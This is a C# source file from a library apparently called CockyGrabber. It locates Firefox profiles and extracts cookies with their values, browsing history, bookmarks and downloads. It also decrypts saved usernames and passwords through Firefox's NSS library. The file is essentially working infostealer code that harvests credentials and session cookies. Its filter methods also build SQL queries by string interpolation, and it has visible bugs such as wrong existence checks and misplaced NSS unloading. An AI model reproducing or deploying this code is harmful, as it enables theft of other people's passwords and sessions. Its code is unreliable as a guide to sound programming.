using CockyGrabber.Utility;
using CockyGrabber.Utility.Cryptography;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class GeckoGrabber
    {
        private const string CookieCommandText = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
        private const string HistoryCommandText = "SELECT id,url,title,rev_host,visit_count,hidden,typed,frecency,last_visit_date,guid,foreign_count,url_hash,description,preview_image_url,origin_id,site_name FROM moz_places";
        private const string BookmarkCommandText = "SELECT id,type,fk,parent,position,title,keyword_id,folder_type,dateAdded,lastModified,guid,syncStatus,syncChangeCounter FROM moz_bookmarks";
        private const string DownloadCommandText = "SELECT id,place_id,anno_attribute_id,content,flags,expiration,type,dateAdded,lastModified FROM moz_annos";
        public virtual string ProfilesPath { get; set; }
        public string[] Profiles { get; private set; }
        private const string CookiesPath = "\\cookies.sqlite";
        private const string LoginsPath = "\\logins.json";
        private const string PlacesPath = "\\places.sqlite";

        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();

        public GeckoGrabber()
        {
            // Check if all profiles exist:
            if (!Directory.Exists(ProfilesPath))
                throw new GrabberException(GrabberError.ProfileNotFound, $"Gecko profile path was not found: {ProfilesPath}");

            // Store all valid gecko profiles:
            Profiles = Directory.GetDirectories(ProfilesPath).Where(str => File.Exists(str + CookiesPath) && File.Exists(str + "\\logins.json")).ToArray();
            
            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
        }

        #region IO Functions
        /// <summary>
        /// Copies a file to a temporary location in %temp%
        /// </summary>
        /// <param name="path">Path to the file that should be copied to a temporary location</param>
        /// <returns>The path to the temp file</returns>
        private string CopyToTempFile(string path)
        {
            string tempFilePath = GetTempFilePath();
            if (File.Exists(tempFilePath)) // If File already exists:
                return CopyToTempFile(path); // Repeat previous steps
            File.Copy(path, tempFilePath);
            return tempFilePath;
        }

        /// <summary>
        /// Create an imaginary path to a temporary file in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database of a specific profile with the stored cookies was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the cookies exist</returns>
        public bool CookiesExist(string profilePath) => File.Exists(profilePath + CookiesPath);

        /// <summary>
        /// Returns a value depending on if the database of a specific profile with the stored logins was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the logins exist</returns>
        public bool LoginsExist(string profilePath) => File.Exists(profilePath + LoginsPath);

        /// <summary>
        /// Returns a value depending on if the database with the stored browser history was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the history exist</returns>
        public bool HistoryExist(string profilePath) => File.Exists(profilePath + PlacesPath);

        /// <summary>
        /// Returns a value depending on if the database with the bookmarks was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the bookmarks exist</returns>
        public bool BookmarksExist(string profilePath) => File.Exists(profilePath + PlacesPath);

        /// <summary>
        /// Returns a value depending on if the database with the downloads was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if stored downloads exist</returns>
        public bool DownloadsExist(string profilePath) => File.Exists(profilePath + PlacesPath);
        #endregion

        #region GetCookies()
        public IEnumerable<Gecko.Cookie> GetCookiesBy(Gecko.Cookie.Header by, object value)
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6)),
                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return cookies;
        }

        public IEnumerable<Gecko.Cookie> GetCookies()
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            foreach (string profile in Profiles)
            {
                if (!CookiesExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = CookieCommandText;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6) * 1000),
                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return cookies;
        }
        #endregion

        #region GetLogins()
        /// <summary>
        /// Converts the as parameter passed dynamic object to a list of Logins
        /// </summary>
        /// <param name="logins">dynamic json object</param>
        /// <returns>A list of Gecko Logins</returns>
        private static List<Gecko.Login> ConvertDynamicObjectsToLogins(List<object> logins)
        {
            List<Gecko.Login> _logins = new List<Gecko.Login>();
            foreach (dynamic obj in logins)
            {
                _logins.Add(new Gecko.Login
                {
                    Id = obj.id,
                    Hostname = (string)obj.hostname,
                    HttpRealm = (string)obj.httpRealm,
                    FormSubmitURL = (string)obj.formSubmitURL,
                    UsernameField = (string)obj.usernameField,
                    PasswordField = (string)obj.passwordField,
                    EncryptedUsername = (string)obj.encryptedUsername,
                    DecryptedUsername = GeckoDecryptor.DecryptValue((string)obj.encryptedUsername),
                    EncryptedPassword = (string)obj.encryptedPassword,
                    DecryptedPassword = GeckoDecryptor.DecryptValue((string)obj.encryptedPassword),
                    Guid = (string)obj.guid,
                    EncType = (short)obj.encType,
                    TimeCreated = UnixTimeInMillisecondsToDate((long)obj.timeCreated),
                    TimeLastUsed = UnixTimeInMillisecondsToDate((long)obj.timeLastUsed),
                    TimePasswordChanged = UnixTimeInMillisecondsToDate((long)obj.timePasswordChanged),
                    TimesUsed = (uint)obj.timesUsed,
                });
            }
            return _logins;
        }

        public IEnumerable<Gecko.Login> GetLogins()
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw an Exception if the Login File was not found

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
                List<Gecko.Login> _logins = ConvertDynamicObjectsToLogins(json.logins);
                logins.AddRange(_logins);
            }
            GeckoDecryptor.UnLoadNSS(); // Unload NSS
            return logins;
        }

        public IEnumerable<Gecko.Login> GetLoginsBy(Gecko.Login.Header by, object value)
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw a Exception if the Login File was not found

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
                foreach (Gecko.Login l in ConvertDynamicObjectsToLogins(json.logins))
                {
                    switch (by)
                    {
                        case Gecko.Login.Header.id:
                            if (l.Id == (int)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.hostname:
                            if (l.Hostname == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.httpRealm:
                            if (l.HttpRealm == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.formSubmitURL:
                            if (l.FormSubmitURL == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.usernameField:
                            if (l.UsernameField == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.passwordField:
                            if (l.PasswordField == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encryptedUsername:
                            if (l.EncryptedUsername == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encryptedPassword:
                            if (l.EncryptedPassword == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.guid:
                            if (l.Guid == (string)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.encType:
                            if (l.EncType == (short)value) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timeCreated:
                            if (l.TimeCreated == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timeLastUsed:
                            if (l.TimeLastUsed == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timePasswordChanged:
                            if (l.TimePasswordChanged == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.Login.Header.timesUsed:
                            if (l.TimesUsed == (int)value) logins.Add(l);
                            break;
                    }
                }
                GeckoDecryptor.UnLoadNSS(); // Unload NSS
            }
            return logins;
        }
        #endregion

        #region GetHistory()
        public IEnumerable<Gecko.Site> GetHistoryBy(Gecko.Site.Header by, object value)
        {
            List<Gecko.Site> history = new List<Gecko.Site>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined

            foreach (string profile in Profiles)
            {
                if (!HistoryExist(profile)) throw new GrabberException(GrabberError.HistoryNotFound, $"The History database could not be found: {profile + PlacesPath}"); // throw a Exception if the History DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{HistoryCommandText} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Gecko.Site()
                            {
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader[2].Equals(DBNull.Value) ? null : reader.GetString(2),
                                RevHost = reader.GetString(3),
                                VisitCount = reader.GetInt32(4),
                                IsHidden = reader.GetBoolean(5),
                                IsTyped = reader.GetBoolean(6),
                                Frecency = reader.GetInt32(7),
                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                Guid = reader.GetString(9),
                                ForeignCount = reader.GetInt32(10),
                                UrlHash = reader.GetInt64(11),
                                Description = reader[12].Equals(DBNull.Value) ? null : reader.GetString(12),
                                PreviewImageUrl = reader[13].Equals(DBNull.Value) ? null : reader.GetString(13),
                                Originid = reader.GetInt32(14),
                                SiteName = reader[15].Equals(DBNull.Value) ? null : reader.GetString(15),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return history;
        }

        public IEnumerable<Gecko.Site> GetHistory()
        {
            List<Gecko.Site> history = new List<Gecko.Site>();

            foreach (string profile in Profiles)
            {
                if (!HistoryExist(profile)) throw new GrabberException(GrabberError.HistoryNotFound, $"The History database could not be found: {profile + PlacesPath}"); // throw a Exception if the History DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = HistoryCommandText;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Gecko.Site()
                            {
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader[2].Equals(DBNull.Value) ? null : reader.GetString(2),
                                RevHost = reader.GetString(3),
                                VisitCount = reader.GetInt32(4),
                                IsHidden = reader.GetBoolean(5),
                                IsTyped = reader.GetBoolean(6),
                                Frecency = reader.GetInt32(7),
                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                Guid = reader.GetString(9),
                                ForeignCount = reader.GetInt32(10),
                                UrlHash = reader.GetInt64(11),
                                Description = reader[12].Equals(DBNull.Value) ? null : reader.GetString(12),
                                PreviewImageUrl = reader[13].Equals(DBNull.Value) ? null : reader.GetString(13),
                                Originid = reader.GetInt32(14),
                                SiteName = reader[15].Equals(DBNull.Value) ? null : reader.GetString(15),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return history;
        }
        #endregion

        #region GetBookmarks()
        public IEnumerable<Gecko.Bookmark> GetBookmarksBy(Gecko.Bookmark.Header by, object value)
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined

            foreach (string profile in Profiles)
            {
                if (!BookmarksExist(profile)) throw new GrabberException(GrabberError.BookmarksNotFound, $"The database that stores the Bookmarks could not be found: {profile + PlacesPath}"); // throw a Exception if the Bookmarks DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{BookmarkCommandText} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // If the foreign key is null: continue because this is not a bookmark but a bookmark tag
                            if (reader[2].Equals(DBNull.Value))
                                continue;
                            // If title is null: continue
                            if (reader[5].Equals(DBNull.Value))
                                continue;

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int fk = reader.GetInt32(2); // Get foreign key
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{fk}'";

                                bookmarks.Add(new Gecko.Bookmark()
                                {
                                    Id = reader.GetInt32(0),
                                    Type = reader.GetInt32(1),
                                    ForeignKey = fk,
                                    Parent = reader.GetInt32(3),
                                    Position = reader.GetInt32(4),
                                    Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                    KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                    FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(9)),
                                    Guid = reader.GetString(10),
                                    SyncStatus = reader.GetInt32(11),
                                    SyncChangeCounter = reader.GetInt32(12),

                                    Url = (string)_cmd.ExecuteScalar(),
                                });
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return bookmarks;
        }

        public IEnumerable<Gecko.Bookmark> GetBookmarks()
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();

            foreach (string profile in Profiles)
            {
                if (!BookmarksExist(profile)) throw new GrabberException(GrabberError.BookmarksNotFound, $"The database that stores the Bookmarks could not be found: {profile + PlacesPath}"); // throw a Exception if the Bookmarks DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = BookmarkCommandText;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // If the foreign key is null: continue because this is not a bookmark but a bookmark tag
                            if (reader[2].Equals(DBNull.Value))
                                continue;
                            // If title is null: continue
                            if (reader[5].Equals(DBNull.Value))
                                continue;

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int fk = reader.GetInt32(2); // Get foreign key
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{fk}'";

                                bookmarks.Add(new Gecko.Bookmark()
                                {
                                    Id = reader.GetInt32(0),
                                    Type = reader.GetInt32(1),
                                    ForeignKey = fk,
                                    Parent = reader.GetInt32(3),
                                    Position = reader.GetInt32(4),
                                    Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                    KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                    FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(9)),
                                    Guid = reader.GetString(10),
                                    SyncStatus = reader.GetInt32(11),
                                    SyncChangeCounter = reader.GetInt32(12),

                                    Url = (string)_cmd.ExecuteScalar(),
                                });
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return bookmarks;
        }
        #endregion

        #region GetDownloads()
        public IEnumerable<Gecko.Download> GetDownloadsBy(Gecko.Download.Header by, object value)
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined

            foreach (string profile in Profiles)
            {
                if (!DownloadsExist(profile)) throw new GrabberException(GrabberError.DownloadsNotFound, $"The database that stores the Downloads could not be found: {profile + PlacesPath}"); // throw a Exception if the Downloads DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{DownloadCommandText} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        Gecko.Download temp = new Gecko.Download(); // temp download model
                        while (reader.Read())
                        {
                            int aaId = reader.GetInt32(2); // Get anno attribute id (1 = file, 2 = metadata)
                            string content = reader.GetString(3); // Get content

                            if (aaId == 2) // If anno attribute id is metadata
                            {
                                // Save metadata in variables:
                                string _state = Regex.Match(content, "{\"state\":.+?,").Value;
                                Console.WriteLine(_state);
                                _state = _state.Replace("{\"state\":", null); // Remove {"state":
                                Console.WriteLine(_state.Remove(_state.LastIndexOf(',')));
                                short state = short.Parse(_state.Remove(_state.LastIndexOf(','))); // Remove ',' and parse

                                string _endtime = Regex.Match(content, "\"endTime\":.+?,").Value;
                                _endtime = _endtime.Replace("\"endTime\":", null); // Remove "endTime":
                                long endtime = long.Parse(_endtime.Remove(_endtime.LastIndexOf(','))); // Remove ',' and parse

                                string _filesize = Regex.Match(content, "\"fileSize\":.+?}").Value;
                                _filesize = _filesize.Replace("\"fileSize\":", null); // Remove "fileSize":
                                long filesize = long.Parse(_filesize.Remove(_filesize.LastIndexOf('}'))); // Remove '}' and parse

                                // Add metadata to the temporary download model:
                                temp.State = state;
                                temp.EndTime = UnixTimeInMicrosecondsToDate(endtime);
                                temp.FileSize = filesize;

                                downloads.Add(temp); // Add temporary model to list

                                continue; // skip this one
                            }

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int pId = reader.GetInt32(1); // Get place id
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{pId}'";

                                temp = new Gecko.Download()
                                {
                                    Id = reader.GetInt32(0),
                                    PlaceId = pId,
                                    AnnoAttributeId = aaId,
                                    Content = content,
                                    Flags = reader.GetInt16(4),
                                    Expiration = reader.GetInt32(5),
                                    Type = reader.GetInt16(6),
                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
                                };
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return downloads;
        }

        public IEnumerable<Gecko.Download> GetDownloads()
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();

            foreach (string profile in Profiles)
            {
                if (!DownloadsExist(profile)) throw new GrabberException(GrabberError.DownloadsNotFound, $"The database that stores the Downloads could not be found: {profile + PlacesPath}"); // throw a Exception if the Downloads DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + PlacesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = DownloadCommandText;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        Gecko.Download temp = new Gecko.Download(); // temp download model
                        while (reader.Read())
                        {
                            int aaId = reader.GetInt32(2); // Get anno attribute id (1 = file, 2 = metadata)
                            string content = reader.GetString(3); // Get content

                            if (aaId == 2) // If anno attribute id is metadata
                            {
                                // Save metadata in variables:
                                string _state = Regex.Match(content, "{\"state\":.+?,").Value;
                                _state = _state.Replace("{\"state\":", null); // Remove {"state":
                                short state = short.Parse(_state.Remove(_state.LastIndexOf(','))); // Remove ',' and parse

                                string _endtime = Regex.Match(content, "\"endTime\":.+?,").Value;
                                _endtime = _endtime.Replace("\"endTime\":", null); // Remove "endTime":
                                long endtime = long.Parse(_endtime.Remove(_endtime.LastIndexOf(','))); // Remove ',' and parse

                                string _filesize = Regex.Match(content, "\"fileSize\":.+?}").Value;
                                _filesize = _filesize.Replace("\"fileSize\":", null); // Remove "fileSize":
                                long filesize = long.Parse(_filesize.Remove(_filesize.LastIndexOf('}'))); // Remove '}' and parse

                                // Add metadata to the temporary download model:
                                temp.State = state;
                                temp.EndTime = UnixTimeInSecondsToDate(endtime);
                                temp.FileSize = filesize;

                                downloads.Add(temp); // Add temporary model to list

                                continue; // skip this one
                            }

                            using (var _cmd = conn.CreateCommand())
                            {
                                // Get the URL of the bookmark which is stored in a different table (moz_places) than the bookmark table (moz_bookmarks):
                                int pId = reader.GetInt32(1); // Get place id
                                _cmd.CommandText = $"SELECT url FROM moz_places WHERE id = '{pId}'";

                                temp = new Gecko.Download()
                                {
                                    Id = reader.GetInt32(0),
                                    PlaceId = pId,
                                    AnnoAttributeId = aaId,
                                    Content = content,
                                    Flags = reader.GetInt16(4),
                                    Expiration = reader.GetInt32(5),
                                    Type = reader.GetInt16(6),
                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
                                };
                            }
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return downloads;
        }
        #endregion

        // TimeStamp To DateTimeOffset functions:
        private static DateTimeOffset UnixTimeInSecondsToDate(long seconds) => DateTimeOffset.FromUnixTimeMilliseconds(seconds/* * 1000*/);
        private static DateTimeOffset UnixTimeInMillisecondsToDate(long milliSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(milliSeconds);
        private static DateTimeOffset UnixTimeInMicrosecondsToDate(long microSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(microSeconds / 1000);
    }
}